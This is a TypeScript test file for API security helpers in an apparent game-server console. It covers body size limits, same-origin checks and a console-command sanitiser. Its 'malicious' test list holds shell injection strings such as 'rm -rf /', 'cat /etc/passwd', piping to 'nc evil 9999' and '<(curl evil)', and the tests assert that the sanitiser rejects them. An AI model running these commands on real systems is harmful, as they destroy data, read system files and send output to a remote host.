import { checkSameOrigin, getRequestBodyLimit, getRequestSizeViolation, sanitizeConsoleCommand } from "@/lib/api-helpers";

describe("api security helpers", () => {
  it("uses route-specific body size overrides", () => {
    expect(getRequestBodyLimit("/api/anything")).toBe(512 * 1024);
    expect(getRequestBodyLimit("/api/platform-editor")).toBe(2 * 1024 * 1024);
    expect(getRequestBodyLimit("/api/game-hub/servers/demo/files/upload")).toBe(10 * 1024 * 1024);
  });

  it("rejects oversized request bodies", () => {
    const violation = getRequestSizeViolation(
      { headers: new Headers({ "content-length": String(3 * 1024 * 1024) }) },
      "/api/platform-editor",
    );

    expect(violation).toContain("Request body too large");
  });

  it("accepts same-origin browser requests", () => {
    const allowed = checkSameOrigin({
      headers: new Headers({
        host: "console.example.com",
        origin: "https://console.example.com",
      }),
    });

    expect(allowed).toBe(true);
  });

  it("rejects cross-origin browser requests", () => {
    const allowed = checkSameOrigin({
      headers: new Headers({
        host: "console.example.com",
        origin: "https://evil.example.com",
      }),
    });

    expect(allowed).toBe(false);
  });
});

describe("sanitizeConsoleCommand (char allowlist)", () => {
  it("requires a non-empty command", () => {
    expect(sanitizeConsoleCommand("   ").ok).toBe(false);
    expect(sanitizeConsoleCommand("").ok).toBe(false);
  });

  it("accepts legitimate game console commands", () => {
    const valid = [
      "say Hello, world!",
      "give @p minecraft:diamond 64",
      "tp @p 100 64 -200",
      "gamerule doDaylightCycle false",
      'tellraw @a {"text":"hi","color":"red"}',
      "execute as @a at @s run setblock ~ ~1 ~ minecraft:stone",
      "op SomePlayer_123",
    ];
    for (const command of valid) {
      const result = sanitizeConsoleCommand(command);
      expect(result.ok).toBe(true);
      if (result.ok) expect(result.value).toBe(command.trim());
    }
  });

  it("rejects shell metacharacters via the allowlist", () => {
    const malicious = [
      "stop; rm -rf /",
      "say hi && cat /etc/passwd",
      "say hi || id",
      "echo $(whoami)",
      "echo `id`",
      "say hi | nc evil 9999",
      "say ${HOME}",
      "say <(curl evil)",
      "say hi\nrm -rf /",
    ];
    for (const command of malicious) {
      expect(sanitizeConsoleCommand(command).ok).toBe(false);
    }
  });

  it("strips null bytes before validating", () => {
    expect(sanitizeConsoleCommand("say hi\0").ok).toBe(true);
  });
});
